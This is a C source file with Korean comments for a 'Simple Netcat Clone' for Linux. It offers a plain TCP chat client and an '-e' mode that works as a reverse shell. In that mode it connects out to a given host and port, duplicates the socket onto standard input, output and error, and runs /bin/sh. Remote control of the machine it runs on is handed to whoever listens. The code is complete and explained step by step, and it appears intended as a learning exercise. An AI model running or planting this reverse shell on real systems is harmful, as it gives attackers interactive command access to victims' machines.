#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <pthread.h>

#define BUFFER_SIZE 4096

// --- 함수 선언 ---
int run_client(const char *host, const char *port, int enable_shell);
void handle_io(int sockfd);
void cleanup(int sockfd);
int run_reverse_shell(int sockfd);

// --------------------- 메인 함수 ---------------------
int main(int argc, char **argv) {
    int iResult;

    // 리눅스에서는 WSAStartup/WSACleanup이 필요 없습니다.
    
    // 명령줄 파싱
    if (argc == 3) {
        // 클라이언트 모드 (채팅): my_netcat <host> <port>
        iResult = run_client(argv[1], argv[2], 0);
    } else if (argc == 5 && strcmp(argv[3], "-e") == 0) {
        // 클라이언트 모드 (리버스 쉘): my_netcat <host> <port> -e /bin/bash
        iResult = run_client(argv[1], argv[2], 1);
    } else {
        printf("Simple Netcat Clone (Linux)\n");
        printf("Usage:\n");
        printf("  Client (Chat): my_netcat <host> <port>\n");
        printf("  Client (Reverse Shell - Simple): my_netcat <host> <port> -e /bin/bash\n");
        iResult = 1;
    }

    return iResult;
}

// --------------------- 클라이언트/서버 공통 유틸리티 ---------------------

void cleanup(int sockfd) {
    if (sockfd >= 0) {
        shutdown(sockfd, SHUT_RDWR);
        close(sockfd);
    }
}

// --------------------- 클라이언트 로직 ---------------------

/**
 * @brief TCP 클라이언트 모드 로직 (connect)
 */
int run_client(const char *host, const char *port, int enable_shell) {
    int sockfd = -1;
    struct addrinfo *result = NULL, *ptr = NULL, hints;
    int iResult;

    printf("Client mode: Connecting to %s:%s...\n", host, port);

    // 주소 정보 설정 및 획득
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;       
    hints.ai_socktype = SOCK_STREAM; 
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo(host, port, &hints, &result);
    if (iResult != 0) {
        fprintf(stderr, "getaddrinfo failed: %s\n", gai_strerror(iResult));
        return 1;
    }

    // 소켓 생성 및 연결 시도
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        sockfd = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (sockfd < 0) continue;

        if (connect(sockfd, ptr->ai_addr, ptr->ai_addrlen) < 0) {
            close(sockfd);
            sockfd = -1;
            continue;
        }
        break; // 연결 성공
    }

    freeaddrinfo(result);

    if (sockfd < 0) {
        fprintf(stderr, "Unable to connect to server!\n");
        return 1;
    }

    printf("Connection successful.\n");

    if (enable_shell) {
        // 리버스 쉘 모드: 리눅스 표준 리다이렉션 함수 호출
        iResult = run_reverse_shell(sockfd); 
    } else {
        // 일반 채팅 모드
        handle_io(sockfd);
        iResult = 0;
    }

    cleanup(sockfd);

    return iResult;
}

// --------------------- 리눅스 리버스 쉘 로직 ---------------------

/**
 * @brief 쉘의 입출력을 소켓으로 리다이렉션합니다 (Linux POSIX dup2 방식).
 */
int run_reverse_shell(int sockfd) {
    pid_t pid;
    
    // 1. 소켓을 표준 입/출력/에러로 복사 (리다이렉션)
    // 쉘은 0, 1, 2 파일 디스크립터(FD)를 사용하므로, 
    // sockfd를 0(stdin), 1(stdout), 2(stderr)로 복제합니다.
    if (dup2(sockfd, STDIN_FILENO) < 0) {   // 0: 표준 입력 (서버 명령 받기)
        perror("dup2 STDIN_FILENO failed");
        return 1;
    }
    if (dup2(sockfd, STDOUT_FILENO) < 0) {  // 1: 표준 출력 (결과 서버로 전송)
        perror("dup2 STDOUT_FILENO failed");
        return 1;
    }
    if (dup2(sockfd, STDERR_FILENO) < 0) {  // 2: 표준 에러 (에러 서버로 전송)
        perror("dup2 STDERR_FILENO failed");
        return 1;
    }

    // 2. 쉘 프로세스 복제 (fork)
    pid = fork();

    if (pid < 0) {
        perror("fork failed");
        return 1;
    }

    if (pid == 0) {
        // 자식 프로세스 (쉘 실행)

        // 3. 복제한 소켓 핸들을 닫음 (더 이상 필요 없음)
        cleanup(sockfd); 
        
        // 4. 쉘 실행 (execve)
        // 리눅스 표준 쉘인 /bin/sh를 실행합니다.
        char *const argv[] = {"/bin/sh", NULL};
        char *const envp[] = {NULL}; // 환경 변수 (필요시 추가)

        // 현재 프로세스를 /bin/sh로 덮어씌웁니다.
        execve("/bin/sh", argv, envp);

        // execve가 실패했을 때만 실행됨
        perror("execve failed");
        exit(EXIT_FAILURE);
    } else {
        // 부모 프로세스 (대기)
        
        // 쉘이 실행되었으므로 부모는 소켓 핸들을 닫고 종료합니다.
        cleanup(sockfd); 
        
        // 자식 쉘 프로세스가 종료될 때까지 기다릴 수도 있지만, 
        // 리버스 쉘은 보통 즉시 종료하도록 구현합니다.
    }

    return 0;
}

// --------------------- 일반 채팅 I/O 로직 (Linux 버전) ---------------------

// 일반 채팅 I/O 로직 (Linux)
void handle_io(int sockfd) {
    char buffer[BUFFER_SIZE];
    ssize_t bytes_read;
    
    // fd_set을 사용하여 소켓과 표준 입력(키보드)를 동시에 모니터링
    fd_set read_fds;

    printf("Connection established. Start typing.\n");

    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(sockfd, &read_fds);
        FD_SET(STDIN_FILENO, &read_fds); // STDIN_FILENO = 0 (표준 입력)

        // select 함수를 사용하여 sockfd와 STDIN_FILENO 중 입력이 들어오는 곳을 기다림
        if (select(sockfd + 1, &read_fds, NULL, NULL, NULL) < 0) {
            if (errno == EINTR) continue; // 시그널 처리
            perror("select failed");
            break;
        }

        // 1. 소켓 데이터 수신
        if (FD_ISSET(sockfd, &read_fds)) {
            bytes_read = recv(sockfd, buffer, BUFFER_SIZE, 0);
            if (bytes_read > 0) {
                // 받은 데이터를 표준 출력(stdout)으로 출력
                write(STDOUT_FILENO, buffer, bytes_read); 
            } else if (bytes_read == 0) {
                printf("Connection closed by remote peer.\n");
                break;
            } else {
                perror("recv failed");
                break;
            }
        }

        // 2. 표준 입력 (키보드) 데이터 확인
        if (FD_ISSET(STDIN_FILENO, &read_fds)) {
            bytes_read = read(STDIN_FILENO, buffer, BUFFER_SIZE);
            if (bytes_read > 0) {
                // 읽은 데이터를 소켓으로 전송
                if (send(sockfd, buffer, bytes_read, 0) < 0) {
                    perror("send failed");
                    break;
                }
                // 'exit' 명령 처리 (선택 사항)
                if (strncmp(buffer, "exit", 4) == 0) {
                    break;
                }
            } else if (bytes_read == 0) {
                // EOF (Ctrl+D) 입력
                break;
            } else {
                perror("read STDIN_FILENO failed");
                break;
            }
        }
    }
}